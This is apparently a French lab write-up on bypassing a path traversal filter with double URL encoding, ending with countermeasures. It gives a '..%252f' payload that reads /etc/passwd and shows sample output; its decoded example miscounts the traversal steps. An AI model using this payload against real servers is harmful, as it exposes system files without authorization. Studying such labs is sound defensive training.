
# 🧪 Lab 3 - File Path Traversal: Double Décodage URL (Bypass de Filtrage)

---

## 🔍 Description du Lab

Ce lab démontre une variante avancée de la vulnérabilité **Path Traversal**, où l'application :

- Bloque les séquences classiques de traversée (`../`)
- **Décode l’entrée une seconde fois** (double décodage URL) **avant utilisation**

Cette mauvaise gestion du décodage peut être contournée en injectant une **séquence doublement encodée**.

---

## 🎯 Objectif

Récupérer le contenu du fichier **`/etc/passwd`** malgré le filtrage initial.

---

## 🛠️ Outils nécessaires

- ⚔️ **Burp Suite**
- 🧠 Compréhension de l'encodage URL (et sur-encodage)
- 🖥️ Navigateur avec proxy configuré

---

## 🚦 Étapes d’exploitation

### 1. Intercepter une requête d'image

- Utilise Burp pour intercepter une requête `GET` du type :
```

GET /image?filename=product1.jpg HTTP/1.1

```

### 2. Modifier le paramètre `filename`

- Injecte un **double encodage** comme ci-dessous :
```

..%252f..%252f..%252fetc/passwd

````

- `%25` = encodage de `%`
- `%252f` = devient `%2f` après premier décodage = `/` après le second décodage
- Résultat réel après double décodage :
  ```
  ../../../../etc/passwd
  ```

### 3. Lancer la requête

- Le serveur filtre les séquences classiques, **mais ne détecte pas** l’attaque car elles sont **encodées lors du premier passage**.
- Après double décodage, le serveur accède au fichier ciblé.

### 4. Vérifier la réponse

Tu dois voir :


root\:x:0:0\:root:/root:/bin/bash
daemon\:x:1:1\:daemon:/usr/sbin:/usr/sbin/nologin
...



✅ Cela confirme que l’exploitation a réussi.


## 📸 Screenshot 

Ajoute ici une capture d’écran de Burp Suite montrant la requête modifiée et la réponse.

![Path-Traversal](https://github.com/Kabilala/path-traversal/blob/main/lab4/lab4.png)



## 🛡️ Contremesures recommandées

- **Décoder une seule fois** les entrées utilisateur
- **Nettoyer les caractères encodés** avant toute utilisation en tant que chemin de fichier
- Utiliser une **liste blanche stricte** des fichiers accessibles
- Interdire **toute forme de chemin relatif ou absolu** passé par l’utilisateur


## 🎓 Concepts clés

| Terme                  | Explication |
|------------------------|-------------|
| `URL Encoding`         | `%2f` = `/` |
| `Double encoding`      | `%252f` = `%2f` après un premier décodage |
| `Bypass technique`     | Utilisation de l'encodage multiple pour contourner les filtres |


